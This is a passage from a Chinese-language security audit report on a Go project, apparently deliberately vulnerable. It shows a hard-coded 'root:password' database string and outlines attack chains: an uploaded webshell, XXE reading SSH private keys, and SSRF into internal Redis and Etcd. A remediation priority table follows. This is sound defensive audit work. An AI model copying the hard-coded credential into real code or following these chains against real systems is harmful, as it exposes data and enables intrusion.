### VULN-024：硬编码数据库凭证

#### 漏洞描述
数据库连接字符串包含硬编码的用户名和密码。

#### 漏洞代码
```go
// controllers/sqli.go:16
const source = "root:password@tcp(127.0.0.1:3306)/goseccode"  // ↑ 漏洞: 硬编码凭证
```

---

## 攻击链分析

### 攻击链1：文件上传 → WebShell → 完全控制

**组合严重性**：致命

**步骤**：
1. [VULN-015 文件上传漏洞] → 攻击者上传 PHP/Go WebShell 到 `static/upload/` 目录
2. [访问 WebShell] → 攻击者通过浏览器访问上传的 WebShell
3. [执行任意命令] → 攻击者获得服务器控制权限

**最终影响**：完全控制服务器

**前置条件**：服务器配置允许执行上传目录下的脚本文件

---

### 攻击链2：XXE → 读取密钥 → 进一步攻击

**组合严重性**：严重

**步骤**：
1. [VULN-017 XXE漏洞] → 攻击者读取 `/home/user/.ssh/id_rsa` 或配置文件中的密钥
2. [使用泄露的密钥] → 攻击者利用泄露的密钥访问其他服务

**最终影响**：横向移动，扩大攻击范围

---

### 攻击链3：SSRF → 访问内部服务 → 信息泄露

**组合严重性**：严重

**步骤**：
1. [VULN-010 SSRF漏洞1] → 攻击者访问内部未认证的服务（如 Redis、Etcd、内部API）
2. [获取内部信息] → 攻击者获取敏感数据或在内网进一步探测

**最终影响**：内部敏感数据泄露

---

## 修复优先级矩阵

| 优先级 | 漏洞ID | 严重性 | 修复难度 | 说明 |
|--------|--------|--------|----------|------|
| P0 | VULN-001,002,003 | 致命 | 低 | 命令注入，立即修复 |
| P0 | VULN-004,005 | 致命 | 低 | SQL注入，立即修复 |
| P0 | VULN-013,016,017 | 致命 | 低 | 路径遍历、Zip Slip、XXE，立即修复 |
| P1 | VULN-006,007,008,009 | 严重 | 低 | 其他SQLi、XSS |
| P1 | VULN-010,011,012,014,018 | 严重 | 中 | SSRF、SSTI等 |
| P2 | VULN-015,019,020,021,022 | 一般 | 低 | 文件上传、CORS、JSONP |
| P3 | VULN-023,024 | 提示 | 低 | CRLF、硬编码凭证 |

---

## 附录

### 审计时间线
- 审计开始：2026-03-24
- 审计完成：2026-03-24

### 参考资料
- OWASP Top 10
- CWE漏洞分类
- Go语言安全最佳实践

---

**报告结束**
